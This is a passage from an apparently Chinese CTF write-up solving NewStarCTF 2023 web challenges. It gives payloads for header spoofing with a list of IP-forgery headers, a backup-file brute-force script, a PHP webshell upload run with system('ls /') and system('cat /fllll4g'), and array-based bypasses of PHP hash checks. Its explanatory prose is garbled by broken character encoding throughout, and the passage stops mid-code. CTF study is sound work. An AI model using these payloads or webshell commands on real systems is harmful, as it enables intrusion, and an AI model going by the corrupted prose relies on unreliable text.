alt="image-20230926133446856"></p><p>å‘ç”ŸæŠ¥é”™ï¼Œåœ¨æŠ¥é”™ä¿¡æ¯ä¸­å¯»æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰flagï¼š<br><img src="/images/2023-10-4-Newstar-1/image-20230926133538322.png" alt="image-20230926133538322"></p><p>å‘ç°flag,è¿™é‡Œåº”è¯¥æ˜¯æ²¡æœ‰num2çš„å€¼æ‰€ä»¥num2ä¸ºç©ºå°±æŠ¥é”™æ˜¾ç¤ºäº†</p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926133854855.png" alt="image-20230926133854855"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?ctf=1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926133932034.png" alt="image-20230926133932034"></p><p>æ›´å…·æç¤ºæˆ‘ä»¬éœ€è¦å¯»æ‰¾secretçš„å€¼ï¼Œå¹¶ç”¨postä¼ å‚ï¼Œç½‘é¡µæ˜¾ç¤ºä¸Šæ²¡æœ‰secret,é‚£ä¹ˆåœ¨ç½‘é¡µæºç ä¸­æ‰¾ä¸€ä¸‹:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926134135307.png" alt="image-20230926134135307"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk)<br>=&gt;<br>Secret: n3wst4rCTF2023g00000d<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?ctf=1<br>POST:<br>secret=n3wst4rCTF2023g00000d<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134415967.png" alt="image-20230926134415967"></p><p>è¿™é‡Œå›æ˜¾æ˜¯è®¤è¯ä¿¡æ¯ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨cookieè¿›è¡Œèº«ä»½è®¤è¯çš„ï¼Œæ‰€ä»¥ä½¿ç”¨BPæŠ“åŒ…:<br><img src="/images/2023-10-4-Newstar-1/image-20230926134605035.png" alt="image-20230926134605035"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:power=ctfer<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134653693.png" alt="image-20230926134653693"></p><p>æˆ‘ä»¬éœ€è¦ä¿®æ”¹æˆ‘ä»¬è®¿é—®çš„æµè§ˆå™¨ä¸ºNewStarCTF2023:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent:NewStarCTF2023<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134804370.png" alt="image-20230926134804370"></p><p>å‘Šè¯‰æˆ‘ä»¬è®¿é—®çš„æºç½‘é¡µåœ°å€æ˜¯newstarctf.com:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Referer:newstarctf.com<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926135002273.png" alt="image-20230926135002273"></p><p>æœ€åæˆ‘ä»¬éœ€è¦ä¼ªé€ æœ¬åœ°ç”¨æˆ·è®¿é—®,è¿™é‡Œæä¾›äº†ä¸€äº›ç”¨äºä¼ªé€ çš„å­—æ®µ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br> <br>X-Forwarded:127.0.0.1<br> <br>Forwarded-For:127.0.0.1<br> <br>Forwarded:127.0.0.1<br> <br>X-Forwarded-Host:127.0.0.1<br> <br>X-remote-IP:127.0.0.1<br> <br>X-remote-addr:127.0.0.1<br> <br>True-Client-IP:127.0.0.1<br> <br>X-Client-IP:127.0.0.1<br> <br>Client-IP:127.0.0.1<br> <br>X-Real-IP:127.0.0.1<br> <br>Ali-CDN-Real-IP:127.0.0.1<br> <br>Cdn-Src-Ip:127.0.0.1<br> <br>Cdn-Real-Ip:127.0.0.1<br> <br>CF-Connecting-IP:127.0.0.1<br> <br>X-Cluster-Client-IP:127.0.0.1<br> <br>WL-Proxy-Client-IP:127.0.0.1<br> <br>Proxy-Client-IP:127.0.0.1<br> <br>Fastly-Client-Ip:127.0.0.1<br> <br>True-Client-Ip:127.0.0.1<br><br>Host: 127.0.0.1<br></code></pre></td></tr></table></figure><p>[XFFæ¼æ´åˆ©ç”¨<a href="https://cloud.tencent.com/developer/article/2039293">é€šä¿—æ˜“æ‡‚]-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p><p>payload:</p><p>è¿™é‡Œæˆ‘ç”¨äº†X-Real-IP:127.0.0.1ç”¨æ¥ä¼ªé€ :</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Real-IP:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926135303533.png" alt="image-20230926135303533"></p><p>flag&#x3D;flag{47812204-bfe7-4821-b0a5-ca4d18f44e9f}</p><h2 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926135548124.png" alt="image-20230926135548124"></p><p>æ ¹æ®ç½‘é¡µæç¤ºå­˜åœ¨å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼š<br>è®¿é—®robots.txt:<br><img src="/images/2023-10-4-Newstar-1/image-20230926135706266.png" alt="image-20230926135706266"></p><p>è·å¾—åŠä¸ªflag:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag&#123;r0bots_1s_s0_us3ful<br></code></pre></td></tr></table></figure><p>å…ˆä½¿ç”¨æˆ‘ä»¬çš„è‡ªä¸»è„šæœ¬æŸ¥æ‰¾ç½‘é¡µçš„åå°æ–‡ä»¶(åå°æ–‡ä»¶ç›®å½•è¯·ç§èŠ):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;php_bak.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.readlines()<br>    <span class="hljs-comment"># print(bak_data)</span><br><span class="hljs-comment"># å»é™¤æ¢è¡Œç¬¦</span><br>bak_data = []<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data:<br>    bak_data.append(d.strip(<span class="hljs-string">&#x27;\n&#x27;</span>))<br><span class="hljs-comment"># print(bak_data)</span><br>url = <span class="hljs-string">&quot;http://0a2444bb-05dd-4ecf-8cbc-6e34948c0b2a.node4.buuoj.cn:81/&quot;</span><br><br><span class="hljs-keyword">for</span> bak_d <span class="hljs-keyword">in</span> bak_data:<br>    url_final = url + bak_d<br>    r = requests.get(url_final)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># print(type(r.status_code))</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">200</span> == r.status_code):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bak_d, r.status_code))<br><br><br><br><span class="hljs-comment"># l1 = [&#x27;web&#x27;, &#x27;website&#x27;, &#x27;backup&#x27;, &#x27;back&#x27;, &#x27;www&#x27;, &#x27;wwwroot&#x27;, &#x27;temp&#x27;]</span><br><span class="hljs-comment"># l2 = [&#x27;tar&#x27;, &#x27;tar.gz&#x27;, &#x27;zip&#x27;, &#x27;rar&#x27;]</span><br><span class="hljs-comment"># l1 = [&#x27;web&#x27;, &#x27;website&#x27;, &#x27;backup&#x27;, &#x27;back&#x27;, &#x27;www&#x27;, &#x27;wwwroot&#x27;, &#x27;temp&#x27;,&#x27;index&#x27;,&#x27;index.php&#x27;]</span><br><span class="hljs-comment"># l2 = [&#x27;tar&#x27;, &#x27;tar.gz&#x27;, &#x27;zip&#x27;, &#x27;rar&#x27;,&#x27;7z&#x27;,&#x27;php~&#x27;,&#x27;php&#x27;]</span><br><br><br><span class="hljs-comment"># for i in l1:</span><br><span class="hljs-comment">#     for j in l2:</span><br><span class="hljs-comment">#         print(i+&quot; &quot;+j)</span><br><span class="hljs-comment">#         url_final = url + &quot;/&quot; + i + &quot;.&quot; + j</span><br><span class="hljs-comment">#         r = requests.get(url_final)</span><br><span class="hljs-comment">#         print(r)</span><br><br><span class="hljs-comment"># æ‰¾åˆ°æ–‡ä»¶ä¸ºæ­£å¸¸å“åº”:200</span><br><span class="hljs-comment"># www zip</span><br><span class="hljs-comment"># &lt;Response [200]&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926140025030.png" alt="image-20230926140025030"></p><p>å‘ç°å­˜åœ¨ä¸€ä¸ª<a href="http://www.zipæ–‡ä»¶ï¼Œè®¿é—®ä¸‹è½½åæˆ‘ä»¬åœ¨index.phpä¸­å‘ç°äº†åé¢ä¸€åŠflagï¼š">www.zipæ–‡ä»¶ï¼Œè®¿é—®ä¸‹è½½åæˆ‘ä»¬åœ¨index.phpä¸­å‘ç°äº†åé¢ä¸€åŠflagï¼š</a><br><img src="/images/2023-10-4-Newstar-1/image-20230926140146599.png" alt="image-20230926140146599"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">_4nd_www.zip_1s_s0_d4ng3rous&#125;<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{r0bots_1s_s0_us3ful_4nd_<a href="http://www.zip_1s_s0_d4ng3rous}/">www.zip_1s_s0_d4ng3rous}</a></p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926140325625.png" alt="image-20230926140325625"></p><p>æˆ‘ä»¬ç›´æ¥ä¸Šä¼ å›¾ç‰‡æœ¨é©¬æ–‡ä»¶,å¹¶ä½¿ç”¨BPæŠ“åŒ…:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926140502172.png" alt="image-20230926140502172"></p><p>å‘ç°ä¸Šä¼ æˆåŠŸï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å›¾ç‰‡æ–‡ä»¶çš„åç¼€åä¸ºphp:<br><img src="/images/2023-10-4-Newstar-1/image-20230926140550913.png" alt="image-20230926140550913"></p><p>å‘ç°ä¹Ÿä¸Šä¼ æˆåŠŸï¼Œæˆ‘ä»¬è®¿é—®ä¸€ä¸‹&#x2F;upload&#x2F;pass.php:<br><img src="/images/2023-10-4-Newstar-1/image-20230926140653179.png" alt="image-20230926140653179"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926140727477.png" alt="image-20230926140727477"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;cat /fllll4g&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926140810360.png" alt="image-20230926140810360"></p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>ç½‘é¡µä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>ç»•è¿‡ç¬¬ä¸€ä¸ªifï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-comment">//è·å–key1å’Œkey2çš„å€¼ï¼Œä»–ä»¬çš„å€¼ä¸èƒ½ç›¸åŒï¼Œä½†æ˜¯md5çš„å€¼ç›¸åŒï¼Œå¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡æ³•</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//ä¼šå¼ºåˆ¶ç»“æŸphpè¿›ç¨‹ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?key1[]=1&amp;key2[]=2<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927132411728.png" alt="image-20230927132411728"></p><p>ç»•è¿‡ç¬¬äºŒä¸ªif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//è¾“å…¥çš„key3çš„å€¼ï¼Œè¦ä½¿å®ƒçš„md5å€¼å’Œsha1çš„å€¼ç›¸åŒ</span><br>        <span class="hljs-comment">//md5åŠ å¯†å’Œsha1åŠ å¯†å¯¹æ•°ç»„çš„è¿”å›ç»“æœéƒ½æ˜¯null</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927132609158.png" alt="image-20230927132609158"></p><p>ç»•è¿‡ç¬¬ä¸‰ä¸ªifï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//key4è¾“å…¥çš„å€¼çš„å†…å®¹å’Œ/flagä¸­çš„å†…å®¹è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒåˆ™è¿”å›0</span><br>        <span class="hljs-comment">//strcmp()å¦‚æœæ¯”è¾ƒçš„å†…å®¹æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåˆ™ä¼šç›´æ¥è¿”å›0</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927133350093.png" alt="image-20230927133350093"></p><p>ç»•è¿‡ç¬¬å››ä¸ªif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//æˆ‘ä»¬éœ€è¦è¾“å…¥ä¸€ä¸ªkey5çš„å€¼ï¼Œå®ƒçš„ç±»å‹ä¸èƒ½æ˜¯æ•°å­—ï¼Œä½†æ˜¯å®ƒçš„å€¼è¦å¤§äº2023</span><br>        <span class="hljs-comment">//ä½¿ç”¨key5=&quot;9e9&quot;,æ²¡æœ‰ç»•è¿‡å»</span><br>        <span 